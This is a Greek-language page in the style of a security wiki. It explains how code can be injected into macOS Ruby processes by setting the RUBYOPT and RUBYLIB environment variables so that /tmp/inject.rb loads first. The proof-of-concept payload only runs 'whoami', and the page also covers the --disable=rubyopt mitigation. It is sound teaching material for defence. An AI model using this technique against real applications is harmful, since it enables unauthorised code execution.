# Injection σε Ruby Applications του macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Η Ruby αναλύει τα υποστηριζόμενα command-line switches από τη μεταβλητή περιβάλλοντος `RUBYOPT` πριν εκτελέσει ένα script. Η Ruby απορρίπτει την εκτέλεση code μέσω του `-e` στο `RUBYOPT`, αλλά το `-I` μπορεί να προσθέσει έναν κατάλογο αναζήτησης libraries και το `-r` μπορεί να απαιτήσει μια library. Επομένως, μια process που εκκινεί τη Ruby με environment variables υπό τον έλεγχο του attacker μπορεί να εξαναγκαστεί να φορτώσει Ruby code υπό τον έλεγχο του attacker.<sup>[[1]](#references)</sup>

Δημιουργήστε το `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Δημιουργήστε ένα benign Ruby script, όπως το `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Εκτελέστε το με μια ελεγχόμενη τιμή `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Για να απενεργοποιήσετε αυτή τη συμπεριφορά, περάστε το `--disable=rubyopt` (ή `--disable-rubyopt`) **πριν** από το όνομα του script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Μια επιλογή που γράφεται μετά το `hello.rb` μεταβιβάζεται στο script μέσω του `ARGV`· δεν απενεργοποιεί την προηγούμενη επεξεργασία του `RUBYOPT` από τη Ruby.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Αντί να προσθέτει τον κατάλογο φόρτωσης με `-I` μέσα στο `RUBYOPT`, η ξεχωριστή μεταβλητή περιβάλλοντος `RUBYLIB` προσθέτει καταλόγους στο `$LOAD_PATH` της Ruby. Σε συνδυασμό με το `RUBYOPT=-r<module>`, φορτώνει κώδικα του attacker χωρίς να απαιτείται το `-I` στο `RUBYOPT`:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Τεκμηρίωση Ruby - Επιλογές γραμμής εντολών Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
